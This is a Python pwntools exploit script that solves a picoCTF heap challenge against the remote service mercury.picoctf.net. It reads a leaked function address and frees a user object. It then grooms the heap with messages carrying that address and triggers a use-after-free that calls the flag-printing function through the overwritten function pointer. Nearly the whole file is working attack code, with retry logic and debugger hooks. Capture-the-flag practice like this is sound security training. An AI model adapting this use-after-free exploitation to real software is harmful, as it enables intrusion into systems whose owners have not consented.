#!/usr/bin/env python3

from random import randrange
from pwn import *

exe = ELF("./vuln")

context.binary = exe
receive_limits = {"local_debug": [0xdb, 0x13d], "remote_debug": [0x19+0xc2, 0x1d+0x120]}

def conn():
    if args.LOCAL:
        print("*******LOCAL********")
        r = process([exe.path])
    elif args.GDB:
        print("*******GDB********")
        r = process([exe.path])
        gdb.attach(exe.path, 'c')
    elif args.BREAK:
        print("*******BREAK********")
        r = process([exe.path])
        #b * 0x08048d44 # main
        #b * 0x08048a5a # leaveMessage / malloc(8)
        #b * 0x08048afa # delete / free(user)
        #b * 0x080489cb # pay / trigger UAF
        gdb.attach(exe.path, '''
        b * 0x08048afa
        c''')
    else:
        print("*******REMOTE********")
        r = remote("mercury.picoctf.net", 61817)

    return r


def sploit(groom_iters):
    global repeat
    r = conn()
    ignore = r.recvn(0xdb) # ignore welcome message

    # phase 0: extract leaked address of target function
    r.sendline(b"s") # trigger leak of flag-print functionq
    leak_response = r.recvn(0x13d)
    #print(b'leak_response: ' + leak_response)
    prefix_str = b"OOP! Memory lqeak..."
    suffix_str = b'\n'
    begin_idx = leak_response.find(prefix_str) + len(prefix_str)
    end_idx = leak_response.find(suffix_str)
    flag_func_addr = int(leak_response[begin_idx:end_idx].decode('utf-8'), 16)
    print("Leaked flag function addr: " + str(hex(flag_func_addr)))

    # free the object that contains a function pointer
    r.sendline(b"i") # Select: delete account
    r.sendline(b"Y") # confirm deletion
    ignore = r.recv(0x1c)

    # allocate new object(s) containing the address of the function we want to
    # call in order to overwrite the function pointer from the previously
    # free()ed object
    ignore = r.recv(0xe1)
    for i in range(0,groom_iters):
        r.sendline(b"l") # Select: leave a message
        r.sendline(p64(flag_func_addr)) # provide message content: flag_func_addr
        ignore = r.recv(0xe0)

    ignore = r.recv(0x3e)

    # phase 2: invoke overwritten function pointer
    r.sendline(b"p") # trigger
    response = r.recv(0xfd)

    flag = None
    if b"picoCTF" in response:
        end = response.find(b"}")
        flag = response[0:end]
        print(b"FLAG: " + flag)
        repeat = False
    ignore = r.recv(0x13b)
    r.close()
    return flag

repeat = True

def main():
    if args['ITERS']:
            groom_iters = int(args['ITERS'])
    else:
            groom_iters = 1
    print("groom_iters: %d" % groom_iters)

    retry = True
    while retry:
        try:
            flag = sploit(groom_iters)
            retry = False
        except EOFError as e:
            print("target disconnected; probable crash")
            sleep(1.0)

if __name__ == "__main__":
    main()
